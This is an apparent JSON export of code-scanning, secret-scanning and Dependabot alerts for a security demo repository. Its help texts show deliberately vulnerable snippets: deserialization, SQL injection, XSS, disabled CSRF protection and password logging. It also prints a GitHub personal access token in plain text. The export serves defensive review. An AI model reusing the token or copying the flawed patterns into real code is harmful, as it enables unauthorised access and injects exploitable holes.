{
  "code_scanning": [
    {
      "number": 6,
      "created_at": "2025-06-02T13:16:22Z",
      "updated_at": "2025-06-02T13:16:22Z",
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/code-scanning/alerts/6",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/code-scanning/6",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "java/unsafe-deserialization",
        "severity": "error",
        "description": "Deserialization of user-controlled data",
        "name": "java/unsafe-deserialization",
        "tags": [
          "external/cwe/cwe-502",
          "security"
        ],
        "full_description": "Deserializing user-controlled data may allow attackers to execute arbitrary code.",
        "help": "# Deserialization of user-controlled data\nDeserializing untrusted data using any deserialization framework that allows the construction of arbitrary serializable objects is easily exploitable and in many cases allows an attacker to execute arbitrary code. Even before a deserialized object is returned to the caller of a deserialization method a lot of code may have been executed, including static initializers, constructors, and finalizers. Automatic deserialization of fields means that an attacker may craft a nested combination of objects on which the executed initialization code may have unforeseen effects, such as the execution of arbitrary code.\n\nThere are many different serialization frameworks. This query currently supports Kryo, XmlDecoder, XStream, SnakeYaml, JYaml, JsonIO, YAMLBeans, HessianBurlap, Castor, Burlap, Jackson, Jabsorb, Jodd JSON, Flexjson, Gson, JMS, and Java IO serialization through `ObjectInputStream`/`ObjectOutputStream`.\n\n\n## Recommendation\nAvoid deserialization of untrusted data if at all possible. If the architecture permits it then use other formats instead of serialized objects, for example JSON or XML. However, these formats should not be deserialized into complex objects because this provides further opportunities for attack. For example, XML-based deserialization attacks are possible through libraries such as XStream and XmlDecoder.\n\nAlternatively, a tightly controlled whitelist can limit the vulnerability of code, but be aware of the existence of so-called Bypass Gadgets, which can circumvent such protection measures.\n\nRecommendations specific to particular frameworks supported by this query:\n\n**FastJson** - `com.alibaba:fastjson`\n\n* **Secure by Default**: Partially\n* **Recommendation**: Call `com.alibaba.fastjson.parser.ParserConfig#setSafeMode` with the argument `true` before deserializing untrusted data.\n\n\n**FasterXML** - `com.fasterxml.jackson.core:jackson-databind`\n\n* **Secure by Default**: Yes\n* **Recommendation**: Don't call `com.fasterxml.jackson.databind.ObjectMapper#enableDefaultTyping` and don't annotate any object fields with `com.fasterxml.jackson.annotation.JsonTypeInfo` passing either the `CLASS` or `MINIMAL_CLASS` values to the annotation. Read [this guide](https://cowtowncoder.medium.com/jackson-2-10-safe-default-typing-2d018f0ce2ba).\n\n\n**Kryo** - `com.esotericsoftware:kryo` and `com.esotericsoftware:kryo5`\n\n* **Secure by Default**: Yes for `com.esotericsoftware:kryo5` and for `com.esotericsoftware:kryo` &gt;= v5.0.0\n* **Recommendation**: Don't call `com.esotericsoftware.kryo(5).Kryo#setRegistrationRequired` with the argument `false` on any `Kryo` instance that may deserialize untrusted data.\n\n\n**ObjectInputStream** - `Java Standard Library`\n\n* **Secure by Default**: No\n* **Recommendation**: Use a validating input stream, such as `org.apache.commons.io.serialization.ValidatingObjectInputStream`.\n\n\n**SnakeYAML** - `org.yaml:snakeyaml`\n\n* **Secure by Default**: No\n* **Recommendation**: Pass an instance of `org.yaml.snakeyaml.constructor.SafeConstructor` to `org.yaml.snakeyaml.Yaml`'s constructor before using it to deserialize untrusted data.\n\n\n**XML Decoder** - `Standard Java Library`\n\n* **Secure by Default**: No\n* **Recommendation**: Do not use with untrusted user input.\n\n\n**ObjectMesssage** - `Java EE/Jakarta EE`\n\n* **Secure by Default**: Depends on the JMS implementation.\n* **Recommendation**: Do not use with untrusted user input.\n\n\n\n## Example\nThe following example calls `readObject` directly on an `ObjectInputStream` that is constructed from untrusted data, and is therefore inherently unsafe.\n\n\n```java\npublic MyObject {\n  public int field;\n  MyObject(int field) {\n    this.field = field;\n  }\n}\n\npublic MyObject deserialize(Socket sock) {\n  try(ObjectInputStream in = new ObjectInputStream(sock.getInputStream())) {\n    return (MyObject)in.readObject(); // BAD: in is from untrusted source\n  }\n}\n\n```\nRewriting the communication protocol to only rely on reading primitive types from the input stream removes the vulnerability.\n\n\n```java\npublic MyObject deserialize(Socket sock) {\n  try(DataInputStream in = new DataInputStream(sock.getInputStream())) {\n    return new MyObject(in.readInt()); // GOOD: read only an int\n  }\n}\n\n```\n\n## References\n* OWASP vulnerability description: [Deserialization of untrusted data](https://www.owasp.org/index.php/Deserialization_of_untrusted_data).\n* OWASP guidance on deserializing objects: [Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html).\n* Talks by Chris Frohoff &amp; Gabriel Lawrence: [ AppSecCali 2015: Marshalling Pickles - how deserializing objects will ruin your day](http://frohoff.github.io/appseccali-marshalling-pickles/), [OWASP SD: Deserialize My Shorts: Or How I Learned to Start Worrying and Hate Java Object Deserialization](http://frohoff.github.io/owaspsd-deserialize-my-shorts/).\n* Alvaro Muñoz &amp; Christian Schneider, RSAConference 2016: [Serial Killer: Silently Pwning Your Java Endpoints](https://speakerdeck.com/pwntester/serial-killer-silently-pwning-your-java-endpoints).\n* SnakeYaml documentation on deserialization: [SnakeYaml deserialization](https://bitbucket.org/snakeyaml/snakeyaml/wiki/Documentation#markdown-header-loading-yaml).\n* Hessian deserialization and related gadget chains: [Hessian deserialization](https://paper.seebug.org/1137/).\n* Castor and Hessian java deserialization vulnerabilities: [Castor and Hessian deserialization](https://securitylab.github.com/research/hessian-java-deserialization-castor-vulnerabilities/).\n* Remote code execution in JYaml library: [JYaml deserialization](https://www.cybersecurity-help.cz/vdb/SB2020022512).\n* JsonIO deserialization vulnerabilities: [JsonIO deserialization](https://klezvirus.github.io/Advanced-Web-Hacking/Serialisation/).\n* Research by Moritz Bechler: [Java Unmarshaller Security - Turning your data into code execution](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)\n* Blog posts by the developer of Jackson libraries: [On Jackson CVEs: Don’t Panic — Here is what you need to know](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062) [Jackson 2.10: Safe Default Typing](https://cowtowncoder.medium.com/jackson-2-10-safe-default-typing-2d018f0ce2ba)\n* Jabsorb documentation on deserialization: [Jabsorb JSON Serializer](https://github.com/Servoy/jabsorb/blob/master/src/org/jabsorb/).\n* Jodd JSON documentation on deserialization: [JoddJson Parser](https://json.jodd.org/parser).\n* RCE in Flexjson: [Flexjson deserialization](https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html).\n* Android Intent deserialization vulnerabilities with GSON parser: [Insecure use of JSON parsers](https://blog.oversecured.com/Exploiting-memory-corruption-vulnerabilities-on-Android/#insecure-use-of-json-parsers).\n* Research by Matthias Kaiser: [Pwning Your Java Messaging With Deserialization Vulnerabilities](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf).\n* Common Weakness Enumeration: [CWE-502](https://cwe.mitre.org/data/definitions/502.html).\n",
        "security_severity_level": "critical"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.21.4"
      },
      "most_recent_instance": {
        "ref": "refs/heads/main",
        "analysis_key": ".github/workflows/codeql.yml:analyze",
        "environment": "{\"build-mode\":\"none\",\"language\":\"java-kotlin\"}",
        "category": "/language:java-kotlin",
        "state": "open",
        "commit_sha": "d139f37371e88e08e450895d4e223cfea55d0b51",
        "message": {
          "text": "Unsafe deserialization depends on a user-provided value.\nUnsafe deserialization depends on a user-provided value."
        },
        "location": {
          "path": "storage-service/src/main/java/com/github/advancedsecurity/storageservice/controllers/BlobController.java",
          "start_line": 45,
          "end_line": 45,
          "start_column": 24,
          "end_column": 39
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/code-scanning/alerts/6/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 5,
      "created_at": "2025-06-02T13:16:22Z",
      "updated_at": "2025-06-02T13:16:22Z",
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/code-scanning/alerts/5",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/code-scanning/5",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "java/spring-disabled-csrf-protection",
        "severity": "error",
        "description": "Disabled Spring CSRF protection",
        "name": "java/spring-disabled-csrf-protection",
        "tags": [
          "external/cwe/cwe-352",
          "security"
        ],
        "full_description": "Disabling CSRF protection makes the application vulnerable to a Cross-Site Request Forgery (CSRF) attack.",
        "help": "# Disabled Spring CSRF protection\nCross-site request forgery (CSRF) is a type of vulnerability in which an attacker is able to force a user to carry out an action that the user did not intend.\n\nThe attacker tricks an authenticated user into submitting a request to the web application. Typically, this request will result in a state change on the server, such as changing the user's password. The request can be initiated when the user visits a site controlled by the attacker. If the web application relies only on cookies for authentication, or on other credentials that are automatically included in the request, then this request will appear as legitimate to the server.\n\n\n## Recommendation\nWhen you use Spring, Cross-Site Request Forgery (CSRF) protection is enabled by default. Spring's recommendation is to use CSRF protection for any request that could be processed by a browser client by normal users.\n\n\n## Example\nThe following example shows the Spring Java configuration with CSRF protection disabled. This type of configuration should only be used if you are creating a service that is used only by non-browser clients.\n\n\n```java\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;\n\n@EnableWebSecurity\n@Configuration\npublic class WebSecurityConfig extends WebSecurityConfigurerAdapter {\n  @Override\n  protected void configure(HttpSecurity http) throws Exception {\n    http\n      .csrf(csrf ->\n        // BAD - CSRF protection shouldn't be disabled\n        csrf.disable() \n      );\n  }\n}\n\n```\n\n## References\n* OWASP: [Cross Site Request Forgery (CSRF)](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)).\n* Spring Security Reference: [ Cross Site Request Forgery (CSRF) ](https://docs.spring.io/spring-security/reference/servlet/exploits/csrf.html).\n* Common Weakness Enumeration: [CWE-352](https://cwe.mitre.org/data/definitions/352.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.21.4"
      },
      "most_recent_instance": {
        "ref": "refs/heads/main",
        "analysis_key": ".github/workflows/codeql.yml:analyze",
        "environment": "{\"build-mode\":\"none\",\"language\":\"java-kotlin\"}",
        "category": "/language:java-kotlin",
        "state": "open",
        "commit_sha": "d139f37371e88e08e450895d4e223cfea55d0b51",
        "message": {
          "text": "CSRF vulnerability due to protection being disabled."
        },
        "location": {
          "path": "storage-service/src/main/java/com/github/advancedsecurity/storageservice/WebSecurityConfig.java",
          "start_line": 46,
          "end_line": 47,
          "start_column": 3,
          "end_column": 22
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/code-scanning/alerts/5/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 4,
      "created_at": "2025-06-02T13:16:08Z",
      "updated_at": "2025-06-02T13:16:08Z",
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/code-scanning/alerts/4",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/code-scanning/4",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "go/clear-text-logging",
        "severity": "error",
        "description": "Clear-text logging of sensitive information",
        "name": "go/clear-text-logging",
        "tags": [
          "external/cwe/cwe-312",
          "external/cwe/cwe-315",
          "external/cwe/cwe-359",
          "security"
        ],
        "full_description": "Logging sensitive information without encryption or hashing can expose it to an attacker.",
        "help": "# Clear-text logging of sensitive information\nSensitive information that is logged unencrypted is accessible to an attacker who gains access to the logs.\n\n\n## Recommendation\nEnsure that sensitive information is always encrypted or obfuscated before being logged.\n\nIn general, decrypt sensitive information only at the point where it is necessary for it to be used in cleartext.\n\nBe aware that external processes often store the standard out and standard error streams of the application, causing logged sensitive information to be stored.\n\n\n## Example\nThe following example code logs user credentials (in this case, their password) in plain text:\n\n\n```go\npackage main\n\nimport (\n\t\"log\"\n\t\"net/http\"\n)\n\nfunc serve() {\n\thttp.HandleFunc(\"/register\", func(w http.ResponseWriter, r *http.Request) {\n\t\tr.ParseForm()\n\t\tuser := r.Form.Get(\"user\")\n\t\tpw := r.Form.Get(\"password\")\n\n\t\tlog.Printf(\"Registering new user %s with password %s.\\n\", user, pw)\n\t})\n\thttp.ListenAndServe(\":80\", nil)\n}\n\n```\nInstead, the credentials should be encrypted, obfuscated, or omitted entirely:\n\n\n```go\npackage main\n\nimport (\n\t\"log\"\n\t\"net/http\"\n)\n\nfunc serve1() {\n\thttp.HandleFunc(\"/register\", func(w http.ResponseWriter, r *http.Request) {\n\t\tr.ParseForm()\n\t\tuser := r.Form.Get(\"user\")\n\t\tpw := r.Form.Get(\"password\")\n\n\t\tlog.Printf(\"Registering new user %s.\\n\", user)\n\n\t\t// ...\n\t\tuse(pw)\n\t})\n\thttp.ListenAndServe(\":80\", nil)\n}\n\n```\n\n## References\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* OWASP: [Password Plaintext Storage](https://www.owasp.org/index.php/Password_Plaintext_Storage).\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-315](https://cwe.mitre.org/data/definitions/315.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.21.4"
      },
      "most_recent_instance": {
        "ref": "refs/heads/main",
        "analysis_key": ".github/workflows/codeql.yml:analyze",
        "environment": "{\"build-mode\":\"autobuild\",\"language\":\"go\"}",
        "category": "/language:go",
        "state": "open",
        "commit_sha": "34d8df19db9342ad945874196af3076babdf93e6",
        "message": {
          "text": "Sensitive data returned by HTTP request headers flows to a logging call."
        },
        "location": {
          "path": "gallery-service/main.go",
          "start_line": 663,
          "end_line": 663,
          "start_column": 50,
          "end_column": 55
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/code-scanning/alerts/4/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 3,
      "created_at": "2025-06-02T13:16:08Z",
      "updated_at": "2025-06-02T13:16:08Z",
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/code-scanning/alerts/3",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/code-scanning/3",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "go/clear-text-logging",
        "severity": "error",
        "description": "Clear-text logging of sensitive information",
        "name": "go/clear-text-logging",
        "tags": [
          "external/cwe/cwe-312",
          "external/cwe/cwe-315",
          "external/cwe/cwe-359",
          "security"
        ],
        "full_description": "Logging sensitive information without encryption or hashing can expose it to an attacker.",
        "help": "# Clear-text logging of sensitive information\nSensitive information that is logged unencrypted is accessible to an attacker who gains access to the logs.\n\n\n## Recommendation\nEnsure that sensitive information is always encrypted or obfuscated before being logged.\n\nIn general, decrypt sensitive information only at the point where it is necessary for it to be used in cleartext.\n\nBe aware that external processes often store the standard out and standard error streams of the application, causing logged sensitive information to be stored.\n\n\n## Example\nThe following example code logs user credentials (in this case, their password) in plain text:\n\n\n```go\npackage main\n\nimport (\n\t\"log\"\n\t\"net/http\"\n)\n\nfunc serve() {\n\thttp.HandleFunc(\"/register\", func(w http.ResponseWriter, r *http.Request) {\n\t\tr.ParseForm()\n\t\tuser := r.Form.Get(\"user\")\n\t\tpw := r.Form.Get(\"password\")\n\n\t\tlog.Printf(\"Registering new user %s with password %s.\\n\", user, pw)\n\t})\n\thttp.ListenAndServe(\":80\", nil)\n}\n\n```\nInstead, the credentials should be encrypted, obfuscated, or omitted entirely:\n\n\n```go\npackage main\n\nimport (\n\t\"log\"\n\t\"net/http\"\n)\n\nfunc serve1() {\n\thttp.HandleFunc(\"/register\", func(w http.ResponseWriter, r *http.Request) {\n\t\tr.ParseForm()\n\t\tuser := r.Form.Get(\"user\")\n\t\tpw := r.Form.Get(\"password\")\n\n\t\tlog.Printf(\"Registering new user %s.\\n\", user)\n\n\t\t// ...\n\t\tuse(pw)\n\t})\n\thttp.ListenAndServe(\":80\", nil)\n}\n\n```\n\n## References\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* OWASP: [Password Plaintext Storage](https://www.owasp.org/index.php/Password_Plaintext_Storage).\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-315](https://cwe.mitre.org/data/definitions/315.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.21.4"
      },
      "most_recent_instance": {
        "ref": "refs/heads/main",
        "analysis_key": ".github/workflows/codeql.yml:analyze",
        "environment": "{\"build-mode\":\"autobuild\",\"language\":\"go\"}",
        "category": "/language:go",
        "state": "open",
        "commit_sha": "34d8df19db9342ad945874196af3076babdf93e6",
        "message": {
          "text": "Sensitive data returned by HTTP request headers flows to a logging call."
        },
        "location": {
          "path": "gallery-service/main.go",
          "start_line": 644,
          "end_line": 644,
          "start_column": 50,
          "end_column": 61
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/code-scanning/alerts/3/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 2,
      "created_at": "2025-06-02T13:16:08Z",
      "updated_at": "2025-06-02T13:16:08Z",
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/code-scanning/alerts/2",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/code-scanning/2",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "go/sql-injection",
        "severity": "error",
        "description": "Database query built from user-controlled sources",
        "name": "go/sql-injection",
        "tags": [
          "external/cwe/cwe-089",
          "security"
        ],
        "full_description": "Building a database query from user-controlled sources is vulnerable to insertion of malicious code by the user.",
        "help": "# Database query built from user-controlled sources\nIf a database query (such as an SQL or NoSQL query) is built from user-provided data without sufficient sanitization, a malicious user may be able to run commands that exfiltrate, tamper with, or destroy data stored in the database.\n\n\n## Recommendation\nMost database connector libraries offer a way of safely embedding untrusted data into a query by means of query parameters or prepared statements. Use these features rather than building queries by string concatenation.\n\n\n## Example\nIn the following example, assume the function `handler` is an HTTP request handler in a web application, whose parameter `req` contains the request object:\n\n\n```go\npackage main\n\nimport (\n\t\"database/sql\"\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc handler(db *sql.DB, req *http.Request) {\n\tq := fmt.Sprintf(\"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='%s' ORDER BY PRICE\",\n\t\treq.URL.Query()[\"category\"])\n\tdb.Query(q)\n}\n\n```\nThe handler constructs an SQL query involving user input taken from the request object unsafely using `fmt.Sprintf` to embed a request parameter directly into the query string `q`. The parameter may include quote characters, allowing a malicious user to terminate the string literal into which the parameter is embedded and add arbitrary SQL code after it.\n\nInstead, the untrusted query parameter should be safely embedded using placeholder parameters:\n\n\n```go\npackage main\n\nimport (\n\t\"database/sql\"\n\t\"net/http\"\n)\n\nfunc handlerGood(db *sql.DB, req *http.Request) {\n\tq := \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='?' ORDER BY PRICE\"\n\tdb.Query(q, req.URL.Query()[\"category\"])\n}\n\n```\n\n## References\n* Wikipedia: [SQL injection](https://en.wikipedia.org/wiki/SQL_injection).\n* Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.21.4"
      },
      "most_recent_instance": {
        "ref": "refs/heads/main",
        "analysis_key": ".github/workflows/codeql.yml:analyze",
        "environment": "{\"build-mode\":\"autobuild\",\"language\":\"go\"}",
        "category": "/language:go",
        "state": "open",
        "commit_sha": "34d8df19db9342ad945874196af3076babdf93e6",
        "message": {
          "text": "This query depends on a user-provided value.\nThis query depends on a user-provided value."
        },
        "location": {
          "path": "gallery-service/main.go",
          "start_line": 200,
          "end_line": 200,
          "start_column": 26,
          "end_column": 168
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/code-scanning/alerts/2/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 1,
      "created_at": "2025-06-02T13:15:46Z",
      "updated_at": "2025-06-02T13:16:31Z",
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/code-scanning/alerts/1",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/code-scanning/1",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/xss",
        "severity": "error",
        "description": "Client-side cross-site scripting",
        "name": "js/xss",
        "tags": [
          "external/cwe/cwe-079",
          "external/cwe/cwe-116",
          "security"
        ],
        "full_description": "Writing user input directly to the DOM allows for a cross-site scripting vulnerability.",
        "help": "# Client-side cross-site scripting\nDirectly writing user input (for example, a URL query parameter) to a webpage without properly sanitizing the input first, allows for a cross-site scripting vulnerability.\n\nThis kind of vulnerability is also called *DOM-based* cross-site scripting, to distinguish it from other types of cross-site scripting.\n\n\n## Recommendation\nTo guard against cross-site scripting, consider using contextual output encoding/escaping before writing user input to the page, or one of the other solutions that are mentioned in the references.\n\n\n## Example\nThe following example shows part of the page URL being written directly to the document, leaving the website vulnerable to cross-site scripting.\n\n\n```javascript\nfunction setLanguageOptions() {\n    var href = document.location.href,\n        deflt = href.substring(href.indexOf(\"default=\")+8);\n    document.write(\"<OPTION value=1>\"+deflt+\"</OPTION>\");\n    document.write(\"<OPTION value=2>English</OPTION>\");\n}\n\n```\n\n## References\n* OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n* OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n* OWASP [DOM Based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).\n* OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.21.4"
      },
      "most_recent_instance": {
        "ref": "refs/heads/main",
        "analysis_key": ".github/workflows/GHAS.yml:code-scanning",
        "environment": "{}",
        "category": ".github/workflows/GHAS.yml:code-scanning",
        "state": "open",
        "commit_sha": "34d8df19db9342ad945874196af3076babdf93e6",
        "message": {
          "text": "Cross-site scripting vulnerability due to user-provided value."
        },
        "location": {
          "path": "frontend/src/components/Login.vue",
          "start_line": 5,
          "end_line": 5,
          "start_column": 10,
          "end_column": 24
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/code-scanning/alerts/1/instances",
      "dismissal_approved_by": null
    }
  ],
  "secret_scanning": [
    {
      "number": 9,
      "created_at": "2025-06-02T13:43:08Z",
      "updated_at": "2025-06-02T15:42:23Z",
      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/secret-scanning/alerts/9",
      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/secret-scanning/9",
      "locations_url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/secret-scanning/alerts/9/locations",
      "state": "open",
      "secret_type": "github_personal_access_token",
      "secret_type_display_name": "GitHub Personal Access Token",
      "validity": "unknown",
      "multi_repo": false,
      "is_base64_encoded": false,
      "secret": "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",
      "first_location_detected": {
        "path": "README.md",
        "start_line": 7,
        "end_line": 7,
        "start_column": 1,
        "end_column": 41,
        "blob_sha": "835c21470938a0ffbca230d1f879dc8cb2cfb828",
        "blob_url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/git/blobs/835c21470938a0ffbca230d1f879dc8cb2cfb828",
        "commit_sha": "ed0002b1040037c1a681f2ab9b8374dcf148c42c",
        "commit_url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/git/commits/ed0002b1040037c1a681f2ab9b8374dcf148c42c"
      },
      "has_more_locations": true,
      "publicly_leaked": true,
      "resolution": null,
      "resolved_by": null,
      "resolved_at": null,
      "resolution_comment": null,
      "push_protection_bypassed": true,
      "push_protection_bypassed_by": {
        "login": "Sec-champ",
        "id": 203533934,
        "node_id": "U_kgDODCGubg",
        "avatar_url": "https://avatars.githubusercontent.com/u/203533934?v=4",
        "gravatar_id": "",
        "url": "https://api.github.com/users/Sec-champ",
        "html_url": "https://github.com/Sec-champ",
        "followers_url": "https://api.github.com/users/Sec-champ/followers",
        "following_url": "https://api.github.com/users/Sec-champ/following{/other_user}",
        "gists_url": "https://api.github.com/users/Sec-champ/gists{/gist_id}",
        "starred_url": "https://api.github.com/users/Sec-champ/starred{/owner}{/repo}",
        "subscriptions_url": "https://api.github.com/users/Sec-champ/subscriptions",
        "organizations_url": "https://api.github.com/users/Sec-champ/orgs",
        "repos_url": "https://api.github.com/users/Sec-champ/repos",
        "events_url": "https://api.github.com/users/Sec-champ/events{/privacy}",
        "received_events_url": "https://api.github.com/users/Sec-champ/received_events",
        "type": "User",
        "user_view_type": "public",
        "site_admin": false
      },
      "push_protection_bypassed_at": "2025-06-02T13:43:00Z",
      "push_protection_bypass_request_reviewer": null,
      "push_protection_bypass_request_reviewer_comment": null,
      "push_protection_bypass_request_comment": null,
      "push_protection_bypass_request_html_url": null
    }
  ],
  "dependabot": [
    {
      "number": 172,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "pip",
          "name": "requests"
        },
        "manifest_path": "authn-service/requirements.txt",
        "scope": "runtime",
        "relationship": "unknown"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-9hjg-9r4m-mvj7",
        "cve_id": "CVE-2024-47081",
        "summary": "Requests vulnerable to .netrc credentials leak via malicious URLs",
        "description": "### Impact\n\nDue to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.\n\n### Workarounds\nFor older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on your Requests Session ([docs](https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env)).\n\n### References\nhttps://github.com/psf/requests/pull/6965\nhttps://seclists.org/fulldisclosure/2025/Jun/2",
        "severity": "medium",
        "identifiers": [
          {
            "value": "GHSA-9hjg-9r4m-mvj7",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-47081",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7"
          },
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-47081"
          },
          {
            "url": "https://github.com/psf/requests/pull/6965"
          },
          {
            "url": "https://github.com/psf/requests/commit/96ba401c1296ab1dda74a2365ef36d88f7d144ef"
          },
          {
            "url": "https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env"
          },
          {
            "url": "https://seclists.org/fulldisclosure/2025/Jun/2"
          },
          {
            "url": "http://seclists.org/fulldisclosure/2025/Jun/2"
          },
          {
            "url": "http://www.openwall.com/lists/oss-security/2025/06/03/11"
          },
          {
            "url": "http://www.openwall.com/lists/oss-security/2025/06/03/9"
          },
          {
            "url": "http://www.openwall.com/lists/oss-security/2025/06/04/1"
          },
          {
            "url": "http://www.openwall.com/lists/oss-security/2025/06/04/6"
          },
          {
            "url": "https://github.com/advisories/GHSA-9hjg-9r4m-mvj7"
          }
        ],
        "published_at": "2025-06-09T19:06:08Z",
        "updated_at": "2025-06-09T19:06:12Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "pip",
              "name": "requests"
            },
            "severity": "medium",
            "vulnerable_version_range": "< 2.32.4",
            "first_patched_version": {
              "identifier": "2.32.4"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
            "score": 5.3
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.00057,
          "percentile": 0.17919
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
          "score": 5.3
        },
        "cwes": [
          {
